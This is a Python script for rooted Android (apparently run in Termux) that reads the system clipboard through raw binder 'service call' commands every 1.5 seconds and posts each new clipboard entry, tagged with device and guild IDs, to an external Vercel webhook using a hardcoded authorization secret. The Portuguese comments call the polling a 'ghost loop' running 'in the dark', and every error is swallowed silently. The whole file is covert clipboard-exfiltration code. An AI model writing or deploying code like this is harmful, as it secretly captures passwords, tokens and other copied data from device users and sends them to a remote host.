import sys
import time
import subprocess
import requests

if len(sys.argv) < 3:
    sys.exit(1)

device_id = sys.argv[1]
guild_id = sys.argv[2]

URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"

def get_clipboard_binder():
    """Lê a memória bruta do Android, bypassando a trava de segundo plano"""
    try:
        # Comando Root nativo (Ignora se o Termux ta aberto ou minimizado)
        out = subprocess.check_output('service call clipboard 2', shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
        if "Result: Parcel" not in out:
            out = subprocess.check_output('service call clipboard 1', shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
        
        if "Result: Parcel" not in out:
            return ""

        # Monta os bytes da memória RAM
        byte_array = bytearray()
        for line in out.split('\n'):
            if ':' in line and "'" in line:
                hex_part = line.split(':', 1)[1].split("'")[0].strip()
                for word in hex_part.split():
                    if len(word) == 8:
                        b = bytes.fromhex(word)
                        # Inverte para formato legível (Little Endian)
                        byte_array.extend([b[3], b[2], b[1], b[0]])

        # Traduz para texto
        decoded_text = byte_array.decode('utf-16-le', errors='ignore')
        
        # Filtra os lixos da memória para pegar só o texto que você copiou
        valid_strings = []
        for s in decoded_text.split('\x00'):
            s = s.strip()
            if len(s) > 0 and s.isprintable():
                if s not in ['android.content.ClipData', 'text/plain', 'text/html']:
                    if not s.startswith('android.') and not s.startswith('com.android'):
                        valid_strings.append(s)

        if valid_strings:
            return valid_strings[-1]
        return ""
    except Exception:
        return ""

last_clipboard = get_clipboard_binder()

# Loop fantasma
while True:
    try:
        current_clipboard = get_clipboard_binder()
        
        if current_clipboard and current_clipboard != last_clipboard:
            payload = {
                "texto": current_clipboard,
                "device_id": device_id,
                "guild_id": guild_id
            }
            headers = {
                "Content-Type": "application/json",
                "Authorization": AUTH_SECRET
            }
            
            resp = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=5)
            
            if resp.status_code == 200:
                last_clipboard = current_clipboard
    except:
        pass
        
    # Checagem ultrarrápida no escuro
    time.sleep(1.5)
